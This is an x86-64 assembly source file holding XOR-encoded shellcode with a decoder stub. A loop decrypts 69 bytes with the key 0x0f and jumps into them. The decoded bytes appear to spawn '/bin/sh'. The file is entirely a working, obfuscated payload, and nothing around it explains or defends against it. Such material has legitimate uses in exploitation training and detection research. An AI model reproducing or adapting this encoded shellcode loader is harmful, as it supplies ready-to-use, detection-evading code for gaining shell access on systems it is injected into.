.global _start

.text
key:
    .byte 0x0f

shellcode:
    .byte 0xe4, 0x17, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0xf0, 0x20, 0x6d, 0x66, 0x61, 0x20, 0x7c, 0x67, 0xf0, 0x47, 0x3e, 0xcf, 0x87, 0x0a, 0xf9, 0xf0, 0xf0, 0xf0, 0x47, 0x82, 0x32, 0xe7, 0xf0, 0xf0, 0xf0, 0x47, 0x86, 0x0a, 0xd6, 0xf0, 0xf0, 0xf0, 0x47, 0x86, 0x32, 0xc5, 0xf0, 0xf0, 0xf0, 0x47, 0x82, 0x3a, 0xcc, 0xf0, 0xf0, 0xf0, 0x3e, 0xdd, 0xbf, 0x34, 0x00, 0x0a

_start:
    movb key(%rip), %bl
    xorl %eax, %eax
loop:
    leaq shellcode(%rip), %rcx
    addq %rax, %rcx
    xorb %bl, (%rcx)
    inc %ax
    cmpw $69, %ax
    jl loop

    jmp shellcode

